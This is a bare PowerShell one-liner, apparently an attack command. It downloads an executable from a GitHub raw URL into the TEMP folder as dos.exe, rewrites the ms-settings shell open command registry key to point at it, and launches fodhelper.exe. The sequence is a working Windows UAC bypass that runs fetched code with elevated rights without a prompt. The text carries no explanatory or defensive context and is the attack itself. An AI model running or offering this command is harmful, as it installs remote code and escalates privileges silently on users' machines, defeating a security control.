powershell.exe Import-Module BitsTransfer; Start-BitsTransfer -Source https://github.com/ShilpeshTrivedi/SakalaBoobBoon/blob/master/cmd.exe?raw=true -Destination "$env:TEMP\dos.exe"; Set-Location -Path "$env:TEMP"; New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name '(Default)' -Value "$env:TEMP\dos.exe" -Force; Start-Process "C:\Windows\System32\fodhelper.exe"
